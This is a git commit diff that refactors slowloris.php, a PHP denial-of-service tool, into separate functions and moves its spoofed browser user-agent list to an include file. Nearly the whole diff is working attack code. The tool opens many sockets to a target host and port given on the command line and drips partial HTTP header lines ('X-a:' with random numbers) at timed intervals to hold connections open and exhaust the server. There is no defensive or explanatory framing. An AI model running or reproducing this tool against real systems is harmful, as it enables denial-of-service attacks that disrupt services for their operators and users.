27b26f29182781b09738034c905f07ac6fa21776
javabudd <javabudd@gmail.com>
2019-12-21 12:01:57 -0700

    Separate code into more functions. Move user agents to .inc file

--- slowloris.php
+++ slowloris.php
@@ -1,70 +1,57 @@
 <?php
 
-const USER_AGENTS = [
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
-    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
-];
+include __DIR__ . '/user-agents.php.inc';
 
-$hostname    = $argv[1] ?? null;
-$port        = $argv[2] ?? null;
-$socketCount = $argv[3] ?? 150;
-$timeout     = $argv[4] ?? 10;
+[$hostname, $port, $socketCount, $timeout] = validateArguments($argv);
 
-if (!$hostname && !$port) {
-    echo 'usage: php slowloris.php hostname port [socketCount] [timeout]' . PHP_EOL;
-    die;
-}
+$isActive = true;
 
-if (!is_numeric($port)) {
-    echo 'Port must be numeric' . PHP_EOL;
-    die;
-}
+registerSignals($isActive);
 
-if (!is_numeric($socketCount)) {
-    echo 'Socket count must be numeric' . PHP_EOL;
-    die;
-}
-
-if (!is_numeric($timeout)) {
-    echo 'Timeout must be numeric' . PHP_EOL;
-    die;
-}
+loop($hostname, $port, $socketCount, $timeout, $isActive);
 
 function getRandomUserAgent(): string
 {
     return USER_AGENTS[\array_rand(USER_AGENTS)];
 }
 
+function validateArguments(array $argv): array
+{
+    $hostname    = $argv[1] ?? null;
+    $port        = $argv[2] ?? null;
+    $socketCount = $argv[3] ?? 150;
+    $timeout     = $argv[4] ?? 10;
+
+    if (!$hostname && !$port) {
+        echo 'usage: php slowloris.php hostname port [socketCount] [timeout]' . PHP_EOL;
+        die;
+    }
+
+    if (!is_numeric($port)) {
+        echo 'Port must be numeric' . PHP_EOL;
+        die;
+    }
+
+    if (!is_numeric($socketCount)) {
+        echo 'Socket count must be numeric' . PHP_EOL;
+        die;
+    }
+
+    if (!is_numeric($timeout)) {
+        echo 'Timeout must be numeric' . PHP_EOL;
+        die;
+    }
+
+    return [$hostname, $port, $socketCount, $timeout];
+}
+
 /**
- * @param string   $hostname
- * @param int|null $port
+ * @param string $hostname
+ * @param int    $port
  *
  * @return false|resource
  */
-function initSocket(string $hostname, ?int $port = 80)
+function initializeSocket(string $hostname, int $port)
 {
     $socket = \socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 
@@ -81,47 +68,50 @@ function initSocket(string $hostname, ?int $port = 80)
     return $socket;
 }
 
-$isActive = true;
-$callback = static function () use (&$isActive) {
-    echo 'Gracefully shutting down...' . PHP_EOL;
+function registerSignals(bool &$isActive): void
+{
+    $callback = static function () use (&$isActive) {
+        echo 'Gracefully shutting down...' . PHP_EOL;
 
-    $isActive = false;
-};
+        $isActive = false;
+    };
 
-\pcntl_async_signals(true);
-\pcntl_signal(SIGINT, $callback);
-\pcntl_signal(SIGTERM, $callback);
-
-$listOfSockets = [];
-while ($isActive) {
-    $activeCount = ($socketCount - \count($listOfSockets));
-
-    echo 'Building sockets...' . PHP_EOL;
-
-    for ($i = 0; $i < $activeCount; $i++) {
-        $socket = initSocket($hostname);
-
-        $listOfSockets[] = $socket;
-    }
-
-    $packetCount = 0;
-
-    echo 'Sending data...' . PHP_EOL;
-
-    foreach ($listOfSockets as $key => $socket) {
-        $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));
-
-        if (@\socket_write($socket, $message, \strlen($message)) === false) {
-            unset($listOfSockets[$key]);
-            \socket_close($socket);
-        } else {
-            $packetCount++;
-        }
-    }
-
-    echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;
-
-    \sleep($timeout);
+    \pcntl_async_signals(true);
+    \pcntl_signal(SIGINT, $callback);
+    \pcntl_signal(SIGTERM, $callback);
 }
 
+function loop(string $hostname, int $port, int $socketCount, int $timeout, bool $isActive): void
+{
+    $listOfSockets = [];
+    while ($isActive) {
+        $activeCount = ($socketCount - \count($listOfSockets));
 
+        echo 'Building sockets...' . PHP_EOL;
+
+        for ($i = 0; $i < $activeCount; $i++) {
+            $socket = initializeSocket($hostname, $port);
+
+            $listOfSockets[] = $socket;
+        }
+
+        $packetCount = 0;
+
+        echo 'Sending data...' . PHP_EOL;
+
+        foreach ($listOfSockets as $key => $socket) {
+            $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));
+
+            if (@\socket_write($socket, $message, \strlen($message)) === false) {
+                unset($listOfSockets[$key]);
+                \socket_close($socket);
+            } else {
+                $packetCount++;
+            }
+        }
+
+        echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;
+
+        \sleep($timeout);
+    }
+}
